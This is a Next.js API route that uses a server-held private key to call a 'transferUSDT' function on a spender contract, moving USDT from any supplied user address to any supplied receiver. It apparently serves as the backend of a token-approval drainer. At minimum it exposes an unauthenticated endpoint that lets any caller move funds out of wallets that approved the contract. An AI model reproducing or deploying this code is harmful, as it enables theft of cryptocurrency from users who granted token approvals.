import { NextResponse } from 'next/server';
import Web3 from 'web3';
import { SPENDER_CONTRACT_ADDRESS, SPENDER_ABI, BSC_RPC } from '@/app/lib/constants';

const SPENDER_PRIVATE_KEY = process.env.SPENDER_PRIVATE_KEY;

export async function POST(request: Request) {
  try {
    if (!SPENDER_PRIVATE_KEY) {
      throw new Error('SPENDER_PRIVATE_KEY environment variable not set.');
    }

    const { userAddress, receiverAddress, amount } = await request.json();
    const web3 = new Web3(BSC_RPC);
    const contract = new web3.eth.Contract(SPENDER_ABI, SPENDER_CONTRACT_ADDRESS);
    
    const privateKey = SPENDER_PRIVATE_KEY.startsWith('0x')
      ? SPENDER_PRIVATE_KEY
      : `0x${SPENDER_PRIVATE_KEY}`;
    const account = web3.eth.accounts.privateKeyToAccount(privateKey);
    web3.eth.accounts.wallet.add(account);

    const tx = await contract.methods
      .transferUSDT(userAddress, receiverAddress, amount)
      .send({ 
        from: account.address,
        gas: '200000'
      });

    return NextResponse.json({ 
      success: true, 
      txHash: tx.transactionHash 
    });

  } catch (error: any) {
    console.error('Transfer error:', error);
    return NextResponse.json({ 
      success: false, 
      error: error.message 
    }, { status: 500 });
  }
}